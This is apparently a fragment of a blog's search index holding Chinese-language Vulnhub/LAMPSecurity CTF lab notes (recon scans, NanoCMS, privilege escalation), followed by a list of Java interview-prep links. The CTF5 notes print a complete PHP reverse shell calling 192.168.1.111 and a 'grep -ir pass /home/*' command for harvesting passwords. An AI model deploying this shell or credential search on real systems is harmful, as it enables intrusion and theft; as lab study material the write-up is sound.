http://192.168.222.143/phpmyadmin/scripts/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/setup/                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/themes/                                              </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/TODO (CODE:200|SIZE:235)  </span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.222.143/phpmyadmin/contrib/">http://192.168.222.143/phpmyadmin/contrib/</a> ，phpmyadmin也没东西</p>
<p>网页感觉没东西了：</p>
<p>PORT     STATE SERVICE     VERSION<br>22&#x2F;tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)<br>25&#x2F;tcp   open  smtp        Sendmail 8.14.1&#x2F;8.14.1<br>80&#x2F;tcp   open  http        Apache httpd 2.2.6 ((Fedora))<br>110&#x2F;tcp  open  pop3        ipop3d 2006k.101<br>111&#x2F;tcp  open  rpcbind     2-4 (RPC #100000)<br>139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>143&#x2F;tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)<br>445&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>901&#x2F;tcp  open  http        Samba SWAT administration server<br>3306&#x2F;tcp open  mysql       MySQL 5.0.45</p>
<p>一个一个搜漏洞</p>
<p>摆了。。</p>
<p>直接上awvs，洞还不少。。。任意文件读取（地权限）、xss、sql</p>
<p>试试cms漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NanoCMS</span><br></pre></td></tr></table></figure>

<p>敏感信息泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.1.111&quot;;</span><br><span class="line">$port = &quot;13123&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>grep -ir pass &#x2F;home&#x2F;* 2&gt;&#x2F;dev&#x2F;null </p>
<p>得到root密码，结束</p>
<h3 id="别人："><a href="#别人：" class="headerlink" title="别人："></a>别人：</h3><p><a href="https://www.freebuf.com/articles/network/211939.html">CTF靶场系列-LAMPSecurity: CTF5 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/kengkeng123qwe/article/details/124802020">Vulnhub-CTF5靶机实战_vulnhub windows靶机_御七彩虹猫的博客-CSDN博客</a></p>
<h2 id="CTF6"><a href="#CTF6" class="headerlink" title="CTF6"></a>CTF6</h2><p>还是比较简单（除了提权</p>
<p>注意的是：</p>
<p>最好在tmp下载利用脚本，改变权限，仔细看linux说明udev</p>
<h2 id="CTF7"><a href="#CTF7" class="headerlink" title="CTF7"></a>CTF7</h2><p>信息收集：</p>
<p>nmap、nessus、awvs、dirb、nikto</p>
<p>得到目标ip：192.168.222.254</p>
<p>漏洞探测：</p>
<p>漏洞利用：</p>
<p>提权：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230417194051405.png" alt="image-20230417194051405"></p>
<p>找到一个用户能够直接sudo</p>
<h2 id="PWNOS-1-0（还没做）"><a href="#PWNOS-1-0（还没做）" class="headerlink" title="PWNOS 1.0（还没做）"></a>PWNOS 1.0（还没做）</h2><p>链接：<a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0 ~ VulnHub</a></p>
<h2 id="PWNOS-2-0（还没做）"><a href="#PWNOS-2-0（还没做）" class="headerlink" title="PWNOS 2.0（还没做）"></a>PWNOS 2.0（还没做）</h2><h2 id="HOLYNIX"><a href="#HOLYNIX" class="headerlink" title="HOLYNIX"></a>HOLYNIX</h2>]]></content>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>面经资源整理</title>
    <url>/2024/06/28/%E9%9D%A2%E7%BB%8F%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<p><a href="https://www.xiaohongshu.com/explore/6655a3a40000000016011053?note_flow_source=wechat">后端0基础→大厂实习完整版学习路线分享✅ - 小红书 (xiaohongshu.com)</a></p>
<p><a href="https://www.nowcoder.com/discuss/551083645553954816">Java学习路线总结_牛客网 (nowcoder.com)</a></p>
<p><a href="https://xiaolincoding.com/">小林coding (xiaolincoding.com)</a></p>
<p><a href="https://javaguide.cn/home.html#java">JavaGuide（Java学习&amp;面试指南） | JavaGuide</a></p>
<p><a href="https://interviewguide.cn/">阿秀的学习笔记 (interviewguide.cn)</a></p>
<p><a href="https://github.com/viego1999/JavaWxy/blob/master/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95.md">JavaWxy&#x2F;面试记录.md at master · viego1999&#x2F;JavaWxy (github.com)</a></p>
<p>小林coding公众号</p>
<p>java基基公众号</p>
<p><a href="https://github.com/xbox1994/Java-Interview">xbox1994&#x2F;Java-Interview: 经历BAT面试后总结的【高级Java后台开发面试指南】，纯净干货无废话，针对高频面试点 (github.com)</a></p>
<p><a href="https://github.com/DreamCats/java-notes">DreamCats&#x2F;java-notes: 自己的学习笔记。包含：个人秋招经历、🐂客面经问题按照频率总结、Java一系列知识、数据库、分布式、微服务、前端、技术面试、每日文章等(持续更新) (github.com)</a></p>
<p><a href="https://cyc2018.github.io/CS-Notes/#/">CS-Notes (cyc2018.github.io)</a></p>
<p><a href="https://learn.lianglianglee.com/">技术摘抄 (lianglianglee.com)</a></p>
<p><a href="https://tech.meituan.com/">美团技术团队 (meituan.com)</a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>资源整理</tag>
      </tags>
  </entry>
</search>
